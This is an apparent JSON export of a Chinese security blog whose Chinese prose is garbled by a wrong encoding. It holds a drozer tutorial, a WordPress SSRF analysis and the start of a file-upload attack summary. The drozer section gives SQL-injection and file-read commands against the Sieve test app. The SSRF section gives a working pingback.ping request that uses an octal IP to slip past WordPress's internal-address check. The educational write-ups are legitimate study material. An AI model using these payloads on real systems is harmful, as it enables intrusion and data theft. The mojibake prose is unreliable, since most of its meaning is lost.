ÊÄªÁªìÈÄöËøá‰∏äÈù¢ÁöÑpythonÊ≤ôÁõíÈÄÉÈÄ∏ÔºåÂèëÁé∞ËØªpythonÂÆòÁΩëÊâãÂÜåËøòÊòØÂæàÊúâÂøÖË¶ÅÁöÑÔºåÊâæ‰∏™Êó∂Èó¥‰∏ÄÁÇπ‰∏ÄÁÇπÁúãÔºöÔºâÂÖ±Âãâ ÂèÇËÄÉhttps://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"„ÄêMOBILE„Äëhow to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-old-how-to-install-drozer-on-mac/","text":"‰∏ÄÔºöÊ¶ÇËø∞drozerÊòØ‰∏ÄÊ¨æÈíàÂØπAndroidÁ≥ªÁªüÁöÑÂÆâÂÖ®ÊµãËØïÊ°ÜÊû∂„ÄÇdrozerÂèØ‰ª•Â∏ÆÂä©Android appÂíåËÆæÂ§áÂèòÂæóÊõ¥ÂÆâÂÖ®ÔºåÂÖ∂Êèê‰æõ‰∫ÜÂæàÂ§öAndroidÂπ≥Âè∞‰∏ãÁöÑÊ∏óÈÄèÊµãËØïexploit‰æõ‰Ω†‰ΩøÁî®ÂíåÂàÜ‰∫´„ÄÇÂØπ‰∫éËøúÁ®ãÁöÑexploitÔºåÂÆÉÂèØ‰ª•ÁîüÊàêshellcodeÂ∏ÆÂä©‰Ω†ËøõË°åËøúÁ®ãËÆæÂ§áÁÆ°ÁêÜ„ÄÇ Êõ¥Âø´ÁöÑAndroidÂÆâÂÖ®ËØÑ‰º∞drozerÂèØ‰ª•Â§ßÂ§ßÁº©ÂáèAndroidÂÆâÂÖ®ËØÑ‰º∞ÁöÑËÄóÊó∂ÔºåÈÄöËøáÊîªÂáªÊµãËØïÊö¥Èú≤Android APPÁöÑÊºèÊ¥û„ÄÇ Âü∫‰∫éÁúüÊú∫ÁöÑÊµãËØïdrozerËøêË°åÂú®AndroidÊ®°ÊãüÂô®ÂíåÁúüÂÆûËÆæÂ§á‰∏äÔºåÂÆÉÂè™ÈúÄË¶ÅUSBË∞ÉËØïÂç≥ÂèØ‰ΩøÁî®„ÄÇ Ëá™Âä®ÂåñÂíåÊâ©Â±ïdrozerÊúâÂæàÂ§öÊâ©Â±ïÊ®°ÂùóÔºå‰Ω†ÂèØ‰ª•ÊâæÂà∞‰ªñ‰ª¨ËøõË°åÊµãËØï‰ª•ÂèëÁé∞AndroidÂÆâÂÖ®ÈóÆÈ¢ò„ÄÇ ‰∫åÔºöÂÆâË£Ödrozer‰∏ãËΩΩÈìæÊé•Ôºöhttps://github.com/mwrlabs/drozer windowÂíåLinux‰∏ãÁöÑÂÆâË£ÖË¶ÅÁÆÄÂçïÁöÑÂ§öÔºå‰ΩÜÊòØÂú®mac‰∏äÂÆâË£ÖÊó∂ÈÅáÂà∞‰∫Ü‰∏Ä‰∫õÈîôËØØÔºåÂõ†Ê≠§Â∞ÜËá™Â∑±ÁöÑÂÆâË£ÖÊ≠•È™§ËÆ∞ÂΩï‰∏ãÊù•„ÄÇ Âõ†‰∏∫ÊòØÁî®pythonÂÜôÁöÑÔºåÊâÄ‰ª•MacÂèØ‰ª•‰∏ãËΩΩpython.eggÊñá‰ª∂ËøõË°åÂÆâË£Ö„ÄÇ‰ΩÜÊòØÊÉ≥ÈÄöËøáeasy_installÂÆâË£ÖÔºåÂøÖÈ°ªÊã•Êúâ‰ª•‰∏ãËøô‰∫õÊ®°ÂùóÔºö 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 ËÄåÂÆâË£ÖËøáÁ®ã‰∏≠‰∏ªË¶ÅÁöÑÈîôËØØÊòØÁî±pyOpenSSLÈÄ†ÊàêÁöÑ„ÄÇ 1.1 ÂÆâË£Öopenssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 ÁºñËØëpyOpenSSL‰∏çÂπ∏ÁöÑÊòØÂú®ÂêéÈù¢ÂÆâË£ÖPython.eggËøòÊòØ‰ºöÊä•Èîô,ÂéüÂõ†ÊòØDrozerÈúÄË¶ÅÁâπÊÆäÁâàÊú¨ÁöÑopensslÔºåÊàë‰ª¨ÈúÄË¶Å‰∏ãËΩΩ pyOpenSSL v0.13ÔºåÁÑ∂ÂêéÁî®sedÊåá‰ª§‰øÆÂ§çtypoÔºåÂÖ∑‰ΩìÊåá‰ª§Ôºö1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c Êé•‰∏ãÊù•Êàë‰ª¨build OpenSSLÔºåËøôÈáåÈúÄË¶ÅÊåáÊòéÊú¨Êú∫‰∏≠OpenSSL headersÊñá‰ª∂ÁöÑ‰ΩçÁΩÆÔºö123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 ÂÆâË£ÖÂÖ∂‰ªñÊîØÊíëÊñá‰ª∂Áªà‰∫éËøõÂÖ•ÂÆâË£ÖËØ¥ÊòéÊñáÊ°£‰∏≠ÁöÑÊ≠•È™§‰∫Ü12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 ÂÆâË£ÖdrozerÊúÄÂêé‰∏ÄÊ≠•Ôºåinstall drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnningÊ≠§Êó∂ÂèØ‰ª•Âú®‰ªª‰ΩïÁõÆÂΩï‰∏ã‰ΩøÁî®drozer ÂëΩ‰ª§Âï¶ÔºÅ ‰∏âÔºöDrozerÂÖ•Èó®‚Äî Ëé∑ÂèñApp Package‰ø°ÊÅØÊ≠§Â§Ñ‰ª•sieve.apk‰∏∫‰æã drozerÊØè‰∏™Ê®°ÂùóÁöÑ‰ΩúÁî®Ôºö Ëé∑ÂèñAppÂåÖ‰ø°ÊÅØÁöÑÊ®°ÂùóÊòØ ** app.package.* : 2.1 Ëé∑ÂèñËé∑ÂèñAndroidËÆæÂ§á‰∏äÁöÑÊâÄÊúâÁöÑÂÆâË£ÖÁöÑAppÁöÑÂåÖÂêçÂëΩ‰ª§ÊòØÔºö1run app.package.info -a com.mwr.example.sieve run app.package.list ËøôÊù°ÂëΩ‰ª§‰ºöÊääÊâÄÊúâÁöÑAppÈÉΩÂàóÂá∫Êù•ÔºåÂ¶ÇÊûúÊÉ≥ÂÖ∑‰ΩìÊü•ÊâæÊüê‰∏™AppÂèØÂä†‰∏ä-f [AppÂÖ≥ÈîÆÂ≠ó]ÁöÑÂèÇÊï∞ÔºåÂ¶ÇÊü•ÊâæsieveÂú®AndroidËÆæÂ§á‰∏≠ÁöÑÂåÖÂêçÔºö1run app.package.list -f sieve 2.2 Ëé∑ÂèñSieveÁöÑ‰∏Ä‰∫õÂü∫Êú¨‰ø°ÊÅØ1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(Á°ÆÂÆöÊîªÂáªÈù¢)Ëøô‰∏™ÊµãËØïÊïôÁ®ã‰∏ªË¶ÅÂÖ≥Ê≥®ÁöÑÊòØAndroid Âõ∫ÊúâÁöÑIPCÈÄö‰ø°Êú∫Âà∂ÁöÑËÑÜÂº±ÊÄßÔºåËøô‰∫õÁâπÁÇπÂØºËá¥‰∫ÜAppÊ≥ÑÊºèÊïèÊÑü‰ø°ÊÅØÁªôÂêå‰∏ÄÂè∞ËÆæÂ§á‰∏äÁöÑÂÖ∂ÂÆÉApp„ÄÇ Êü•ÊâæÂèØ‰ª•ËøõË°åAttack SurfaceÁöÑÁªÑ‰ª∂ÁöÑÂëΩ‰ª§Ôºö1run app.package.attacksurface com.mwr.example.sieve ÁªìÊûúÊòæÁ§∫‰∫ÜÊΩúÂú®ÂèØ‰ª•Âà©Áî®ÁöÑÁªÑ‰ª∂‰∏™Êï∞Ôºö ‚Äúexported‚ÄùË°®Á§∫ÁªÑ‰ª∂ÂèØ‰ª•Ë¢´ÂÖ∂‰ªñApp‰ΩøÁî®„ÄÇ services is debuggableË°®Á§∫Êàë‰ª¨ÂèØ‰ª•Áî®adbÁªëÂÆö‰∏Ä‰∏™Ë∞ÉËØïÂô®Âà∞ËøõÁ®ã„ÄÇ 2.4 Ëøõ‰∏ÄÊ≠•Ëé∑ÂèñAttack SurfaceÁöÑ‰ø°ÊÅØÂ¶ÇËøõ‰∏ÄÊ≠•Ëé∑ÂèñativityÁªÑÂª∫ÁöÑattack surface‰ø°ÊÅØÁöÑÂëΩ‰ª§ÊòØÔºö1run app.activity.info -a com.mwr.example.sieve 2.5 ÂêØÂä®Activities‰∏äÂõæÁöÑPWListÂíåFileSelectActivityÊòØexportedÂπ∂‰∏î‰∏çÈúÄË¶Å‰ªª‰ΩïÊùÉÈôêÔºåÊàë‰ª¨ÂèØ‰ª•Áî®drozerÂêØÂä®‰ªñ‰ª¨ÔºåÊØîÂ¶ÇÊÑüËßâPWListËøô‰∏™Âê´ÈáëÈáèÂ∫îËØ•Â§ß‰∏ÄÁÇπÔºåÊâÄ‰ª•Â∞±ÂêØÂä®ÂÆÉ‰∫ÜÔºåÂëΩ‰ª§ÊòØÔºö1run app.activity.start ‚Äìcomponent com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 ‰ªéContent Provider‰∏≠Ëé∑Âèñ‰ø°ÊÅØÊé•‰∏ä2.3ËäÇÔºåËøõ‰∏ÄÊ≠•Ëé∑Âèñcontent providerÁöÑattact surfaceÁöÑ‰ø°ÊÅØÁöÑÂëΩ‰ª§ÊòØÔºö1run app.provider.info -a com.mwr.example.sieve ‰ªé‰∏äÂõæÂèØ‰ª•ÁúãÂà∞2.3ËäÇ‰∏≠‰∏§‰∏™exportedÁöÑcontent providerÁöÑÂÖ∑‰Ωì‰ø°ÊÅØÔºåÂåÖÊã¨ÂêçÂ≠óÔºåÊùÉÈôêÔºåËÆøÈóÆË∑ØÂæÑÁ≠â„ÄÇ 2.6.1 Êü•ÊâæÂèØ‰ª•ËÆøÈóÆContent ProviderÁöÑURIÔºàÊï∞ÊçÆÊ≥ÑÊºèÔºâ‰ªé‰∏äËäÇÂõæ‰∏≠Êàë‰ª¨ÁåúÊµãDBContentProvider‰ºöÊúâÊüêÁßçÊ†ºÂºèÁöÑÊï∞ÊçÆÂ∫ìÔºå‰ΩÜÊòØÊàë‰ª¨‰∏çÁü•ÈÅìÂÖ∂‰∏≠ÁöÑÊï∞ÊçÆÊòØÂ¶Ç‰ΩïÁªÑÁªáÁöÑ„ÄÇContent URIÂøÖÈ°ªÊòØ ‚Äúcontent:///‚Äù ÁöÑÂΩ¢Âºè,Âõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†ÈÉ®ÂàÜÁöÑcontent URIsÊù•ËÆøÈóÆDBcontent Provider„ÄÇ ‰∏äÂõæÂ≠òÂú®‰∏Ä‰∏™ÈúÄË¶ÅREAD_KEYSÂíåWRITE_KEYSÊùÉÈôêÊâçËÉΩËØªÂíåÂÜôÁöÑ‚Äú/Keys‚ÄùÁöÑË∑ØÂæÑ„ÄÇdrozerÁöÑscannerÊ®°ÂùóÊèê‰æõ‰∫Ü‰∏Ä‰∫õÊñπÊ≥ïÂéªÁåúÊµãÂèØËÉΩÂ≠òÂú®ÁöÑcontent URIsÔºö1run scanner.provider.finduris -a com.mwr.example.sieve ‰∏äÂõæ‰∏≠Ê£ÄÊµãÂá∫‰∫ÜÂèØ‰ª•ËÆøÈóÆcontentÁöÑURIÔºåÊé•‰∏ãÊù•Êàë‰ª¨ÂèØ‰ª•Áî®drozerÁöÑÂÖ∂‰ªñÊ®°ÂùóÂíåURI‰ªécontent‰∏≠Ëé∑ÂèñÔºåÁîöËá≥Êõ¥Êîπ‰ø°ÊÅØ„ÄÇ Â¶ÇÔºö1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìvertical Â¶Ç‰∏äÂõæÊàë‰ª¨Ëé∑Âèñ‰∫ÜÁî®Êà∑ÂêçÔºåÈÇÆÁÆ±Â∏êÂè∑ÔºåÂíåBase64ÁºñÁ†ÅÁöÑÂØÜÁ†ÅÂ≠óÁ¨¶‰∏≤„ÄÇ 2.6.2 ËøõË°åSQLÊ≥®ÂÖ•AndroidÊìç‰ΩúÁ≥ªÁªüÂª∫ËÆÆ‰ΩøÁî®SQLiteÊï∞ÊçÆÂ∫ìÂ≠òÂÇ®Áî®Êà∑Êï∞ÊçÆ„ÄÇSQLiteÊï∞ÊçÆÂ∫ì‰ΩøÁî®SQLËØ≠Âè•ÔºåÊâÄ‰ª•ÂèØ‰ª•ËøõË°åSQLÊ≥®ÂÖ•„ÄÇ ‰ΩøÁî®projectionÂèÇÊï∞ÂíåselecitonÂèÇÊï∞ÂèØ‰ª•‰º†ÈÄí‰∏Ä‰∫õÁÆÄÂçïÁöÑSQLÊ≥®ÂÖ•ËØ≠Âè•Âà∞Content provider„ÄÇÂ¶ÇÔºö123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìprojection ‚Äú‚Äò‚Äùrun app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìselection ‚Äú‚Äò‚Äù ‰∏äÈù¢‰∏§Êù°ÂëΩ‰ª§ÊâßË°åÂêéAndroidËÆæÂ§áËøîÂõû‰∫ÜÈùûÂ∏∏ËØ¶ÁªÜÁöÑÈîôËØØ‰ø°ÊÅØ„ÄÇ‰ΩøÁî®SqlÊ≥®ÂÖ•ÂàóÂá∫Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊâÄÊúâÊï∞ÊçÆË°®Ôºö1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìprojection ‚Äú* FROM SQLITE_MASTER WHERE type=‚Äôtable‚Äô;‚Äì‚Äú ‰ΩøÁî®SQLÊ≥®ÂÖ•ÂàóÂá∫Êï∞ÊçÆË°®ÁöÑÂÜÖÂÆπÔºö1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìprojection ‚Äú* FROM Key;‚Äì‚Äú ‰ΩøÁî®SQLÊ≥®ÂÖ•ÂàóÂá∫Êï∞ÊçÆË°®ÁöÑÂÜÖÂÆπÔºö1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ ‚Äìprojection ‚Äú* FROM Key;‚Äì‚Äú 2.6.3 ‰ªéFile System-Backed Content ProvidersËé∑Âèñ‰ø°ÊÅØFile System-backed Content ProviderÊèê‰æõ‰∫ÜËÆøÈóÆÂ∫ïÂ±ÇÊñá‰ª∂Á≥ªÁªüÁöÑÊñπÊ≥ïÔºåAndroidÊ≤ôÁõí‰ºöÈòªÊ≠¢AppÂÖ±‰∫´Êñá‰ª∂ÂÖÅËÆ∏ÔºåËÄåFile System-backed Content ProviderÂÖÅËÆ∏AppÂÖ±‰∫´Êñá‰ª∂„ÄÇ ÂØπ‰∫ésieveÊù•ËØ¥ÔºåÊàë‰ª¨ÂèØ‰ª•Êé®ÊµãÂá∫ÁöÑFileBackupProviderÂ∞±ÊòØ‰∏Ä‰∏™file system-backed content provider„ÄÇ Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®drozerÁöÑapp.provider.readÊ®°ÂùóÊü•ÁúãÊüê‰∏™Êñá‰ª∂Ôºö1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts ÂèØ‰ª•‰ΩøÁî®app.provider.download‰∏ãËΩΩÊñá‰ª∂1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 Ê£ÄÊü•Content ProviderÁöÑËÑÜÂº±ÊÄßÊ£ÄÊü•ÊòØÂê¶ÊúâSQLÊ≥®ÂÖ•Ôºö1run scanner.provider.injection -a com.mwr.example.sieve Ê£ÄÊü•ÊòØÂê¶Â≠òÂú®ÈÅçÂéÜÊñá‰ª∂ÁöÑÊºèÊ¥û1run scanner.provider.traversal -a com.mwr.example.sieve ÊÄªÁªì‰Ωì‰ºöÔºöÊàëËßâÂæóÂú®ÂàöÂºÄÂßãËé∑Âèñ‰∫ÜËΩØ‰ª∂ÂåÖÁöÑÂü∫Êú¨‰ø°ÊÅØÂêéÔºåÂ∞±ÂÖàÁî®Ê®°ÂùóscannerÈáåÈù¢ÁöÑÂ∑•ÂÖ∑Êâ´‰∏ÄÊâ´ÔºåÊâæÂà∞‰∏Ä‰∫õÊºèÊ¥ûÊàñËÄÖÂà©Áî®ÁÇπÂêéÂÜçËøõË°å‰∏ã‰∏ÄÊ≠•„ÄÇ 2.7 ÂíåServices‰∫§‰∫íËé∑ÂèñÊòØexportedÁä∂ÊÄÅÁöÑservicesÁöÑÂëΩ‰ª§Ôºö1run app.service.info -a com.mwr.example.sieve ÂÖ≥‰∫éServicesÁöÑÊ®°ÂùóÔºöÂ¶ÇÂêëÊüê‰∏™ÊúçÂä°ÂèëÈÄÅ‰ø°ÊÅØÔºö1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService ‚Äìmsg 1 5 3 2.8 ÂÖ∂‰ªñÂ∏∏Áî®Ê®°Âùó shell.start Âú®AndroidËÆæÂ§á‰∏äÂºÄÂêØ‰∏Ä‰∏™‰∫§‰∫íÂºèLinux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu ÂÆâ Ë£ÖbusyboxÊàñËÄÖminimalsuÂà∞AndroidËÆæÂ§á‰∏ä ÂèÇËÄÉÈìæÊé•Ôºöhttps://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"„ÄêCode Analysis„Äëwordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-old-wordpress-ssrf-4-4-2/","text":"Ê¶ÇËø∞ÂâçÂá†Â§©ÔºåwordpressÁàÜÂá∫‰∏Ä‰∏™SSRFÁöÑÊºèÊ¥ûÔºåË∑üËøõ‰∏Ä‰∏ãÔºåÊü•ÈòÖ‰∫Ü‰∏Ä‰∏ãÔºåÁΩë‰∏äÂπ∂Ê≤°ÊúâËØ¶ÁªÜÁöÑÂà©Áî®ÊñπÂºè„ÄÇ‰ª•Ââç‰πüÊ≤°ÊÄé‰πàÊé•Ëß¶ËøáwordpressÔºåÁúã‰∫Ü‰∏Ä‰∏ãÂèóÂΩ±ÂìçÁöÑ‰ª£Á†ÅÔºåËÆ∞ÂΩï‰∏Ä‰∏ãËøáÁ®ã„ÄÇ ipÂú∞ÂùÄÁöÑÂá†ÁßçË°®Á§∫ÊñπÂºèipÂú∞ÂùÄÂüüÂêçÊúâÂ§öÁßçË°®Á§∫ÊñπÂºèÔºåÊµèËßàÂô®ÈÉΩËÉΩËØÜÂà´Âá∫Êù•„ÄÇ Â∏∏ËßÅÁöÑipÂú∞ÂùÄÂüüÂêçË°®Á§∫ÊñπÊ≥ï ÁÇπÂàÜÂçÅËøõÂà∂Ë°®Á§∫Ê≥ïÔºå‰æãÂ¶Ç192.168.1.2 ‰∫åËøõÂà∂Ë°®Á§∫Ê≥ï‰æãÂ¶Ç11000000101010000000000100000010ÔºåË°®Á§∫192.168.1.2 ÈùûÂ∏∏ËßÅipÂú∞ÂùÄÂüüÂêçË°®Á§∫ÊñπÊ≥ï Êï¥Êï∞ÂûãÔºöÂ∞Ü‰∏äËø∞ÁöÑ‰∫åËøõÂà∂Áõ¥Êé•ËΩ¨Êç¢ÊàêÊï¥Êï∞3232235778ÔºåÊµèËßàÂô®ÈÄöËøáËÆøÈóÆhttp://3232235778 Ëß£Êûê‰∏∫192.168.1.2ÔºåÈô§Ê≠§‰πãÂ§ñËøòÂèØ‰ª•ÈÄöËøáÂÖ¨Âºè192*256^3+168*256^2+1*256+2=3232235778Êç¢ÁÆó ÂÖ´ËøõÂà∂ÂûãÔºöÂ∞ÜIP 192.168.1.2Êç¢Êàê8ËøõÂà∂0300.0250.01.02ÔºåÂú®ÂâçÈù¢Âä†‰∏ä0Ë°®Á§∫8ËøõÂà∂ ÂçÅÂÖ≠ËøõÂà∂ÂûãÔºöÂ∞ÜIP 192.168.1.2Êç¢Êàê16ËøõÂà∂0xc0.0xA8.1.2ÔºåÂú®ÂâçÈù¢Âä†‰∏ä0xË°®Á§∫16ËøõÂà∂ Ê∑∑ÂêàÂûãÔºöÂç≥‰ª•‰∏äÁöÑÂá†ÁßçÊñπÂºèÁöÑÁªìÂêàÔºå0300.0xA8.1.0x02 ‰∏ãÈù¢Â∞±ÊòØÈÄöËøáÂÖ´ËøõÂà∂ÁªïËøáÊ£ÄÊµã„ÄÇ ‰ª£Á†ÅËØ¶ÊÉÖÊºèÊ¥ûÊàêÂõ†Â§Ñ508 wp_http_validate_url ÂáΩÊï∞1234567891011121314151617......if ( ! $same_host ) &#123; $host = trim( $parsed_url['host'], '.' ); if ( preg_match( '#^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;$#', $host ) ) &#123; $ip = $host; &#125; else &#123; $ip = gethostbyname( $host ); if ( $ip === $host ) // Error condition for gethostbyname() $ip = false; &#125; if ( $ip ) &#123; $parts = array_map( 'intval', explode( '.', $ip ) ); if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0] || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] ) || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] ) ) &#123; ...... ËøôÈáåÁöÑ‰ª£Á†ÅÈÄöËøáÊ≠£ÂàôË°®ËææÂºè^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$Âà§Êñ≠ipÊòØÂê¶ÂêàÊ≥ïÔºåÂ¶ÇÊûú‰∏çÂêàÊ≥ïÂàôÈÄöËøáÁΩëÁªúËé∑ÂèñipÁöÑÂÄº„ÄÇ‰∏ãÈù¢ÁöÑifÂà§Êñ≠ÂàôÊòØÁî®Êù•Èò≤Ê≠¢ÁªôÁöÑurl‰∏∫ÂÜÖÁΩëipÔºå‰ΩÜÊòØ‰∏äËø∞ÁöÑÊ≠£ÂàôË°®ËææÂºèÂèØ‰ª•ÈÄöËøá8ËøõÂà∂ÁªïËøáÂÜÖÁΩëÈôêÂà∂„ÄÇ123456if ( empty( $parsed_url['port'] ) ) return $url; $port = $parsed_url['port']; if ( 80 === $port || 443 === $port || 8080 === $port ) return $url; ÂÜçÊé•‰∏ãÊù•ÂèØ‰ª•ÁúãÂà∞Á®ãÂ∫èÂèàÂØπÁ´ØÂè£ÂÅö‰∫ÜÈôêÂà∂ÔºåÂè™ËÉΩÊâ´Êèè80,443,8080Á´ØÂè£„ÄÇÁªº‰∏äÊâÄËø∞ÔºåÈÄöËøá8ËøõÂà∂ÁªïËøáipÂà§Êñ≠ÔºåÂèØ‰ª•Êâ´ÊèèÂÜÖÁΩëÁöÑ80,443,8080Êâæ‰∏Ä‰∏ãË∞ÉÁî®ÁöÑ‰ΩçÁΩÆ,ÂèØ‰ª•ÊâæÂà∞class-wp-xmlrpc-server.phpÈÄöËøáwp_safe_remote_getË∞ÉÁî®‰∫ÜgetÂáΩÊï∞ÔºågetÂáΩÊï∞‰ΩøÁî®‰∫Üwp_http_validate_urlÔºå‰ªéËÄåÈÄ†Êàêssrf Âà©Áî®Âà©Áî®ÁöÑÊñπÂºè‰∏∫ÈÄöËøáxmlrpc.php‰∏≠pingback.pingÂäüËÉΩÊù•Ë∞ÉÁî®Ëøô‰∏™ÂáΩÊï∞„ÄÇPOC123456789101112131415161718POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 321&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt; ËøôÈáåËÆæÁΩÆ10.10.10.111‰∏∫ÂèóÂÆ≥ËÄÖ ÊÄªÁªìÂú®ÊµãËØï‰∏≠ÂèëÁé∞Âè™ËÉΩÂØπ10.x.x.xÁöÑÂÜÖÁΩëipËøõË°åÂà©Áî®ÔºåÂõ†‰∏∫Ê≠£ÂàôÁöÑÂéüÂõ†Ëá≥Â§öÂè™ËÉΩÊúâ3‰ΩçÊï∞Â≠óÔºå‰∏Ä‰ΩçÈúÄË¶Å‰∏∫0Êù•Ë°®Á§∫8ËøõÂà∂ÔºåÊâÄ‰ª•Âà©Áî®Âè™Êúâ10,Âπ∂‰∏îÂè™ËÉΩÊâ´Êèè80,443,8080Á´ØÂè£„ÄÇÁî±‰∫éÂà©Áî®‰∏≠‰∏çÂõûÊòæÔºå‰πüÂæàÈöæÁ°ÆÂÆöÊòØÂê¶ÊàêÂäüÂà©Áî®„ÄÇÊâÄ‰ª•Ëøô‰∏™Ê¥ûÂèØËÉΩÂç±ÂÆ≥ÊØîËæÉÂ∞èÔºàÂ§™Ëèú‰∫ÜÔºåÊÉ≥‰∏çÂà∞ÂÖ∂‰ªñÁöÑÂà©Áî®ÊñπÂºèÔºåÊúâÂÖ∂‰ªñÁöÑÂà©Áî®ÊñπÂºèËÆ∞ÂæóÂàÜ‰∫´ÂïäÔºÅÔºÅÔºÅÔºâËøòÊúâ‰∏ÄÁßçÂà©Áî®Â∞±ÊòØÂºÄÂêØxmlrpcÁöÑwordpressÁ´ôÂèØ‰ª•Ë¢´ÈÄöËøápingback.pingÊñπÊ≥ïÊù•DDOSÔºåËøô‰∏™‰ª•ÂâçÂ∞±Êúâ‰∫∫ÊèêÂá∫Êù•‰∫Ü„ÄÇ ÂèÇËÄÉhttp://xlab.baidu.com/wordpress/https://virusdefender.net/index.php/archives/733/"},{"title":"„ÄêVULNERABLITY„ÄëÊñá‰ª∂‰∏ä‰º†Â≠¶‰π†ÊÄªÁªì","permalink":"http://blog.0kami.cn/2016/07/04/old-old-file-upload/","text":"Ê¶ÇËø∞ËøôÂá†Â§©Á©∫‰∏ãÊù•Ê†πÊçÆ‰∏ä‰º†ÊîªÂáªÊ°ÜÊû∂Â≠¶‰π†ÊÄªÁªì‰∏Ä‰∏ã‰∏ä‰º†ÊîªÂáª„ÄÇ ‰∏ä‰º†Ê£ÄÊµãÊµÅÁ®ã ÂÆ¢Êà∑Á´ØjavascriptÊ£ÄÊµãÔºàÊ£ÄÊµãÊñá‰ª∂Êâ©Â±ïÂêç‰∏∫‰∏ªÔºâ ÊúçÂä°Á´ØMIMEÁ±ªÂûãÊ£ÄÊµãÔºàÊ£ÄÊµãContent-typeÂÜÖÂÆπÔºâ ÊúçÂä°Á´ØÁõÆÂΩïË∑ØÂä≤Ê£ÄÊµãÔºàÊ£ÄÊµãË∑üpathÁõ∏ÂÖ≥ÁöÑÂÜÖÂÆπÔºâ ÊúçÂä°Á´ØÊñá‰ª∂Êâ©Â±ïÂêçÊ£ÄÊµãÔºàÊ£ÄÊµãË∑üÊñá‰ª∂ÂêéÁºÄÁõ∏ÂÖ≥ÁöÑÂÜÖÂÆπÔºâ ÊúçÂä°Á´ØÊñá‰ª∂ÂÜÖÂÆπÊ£ÄÊµãÔºàÊ£ÄÊµãÂÜÖÂÆπÊòØÂê¶ÂêàÊ≥ïÊàñÂê´ÊúâÊÅ∂ÊÑè‰ª£Á†ÅÔºâ 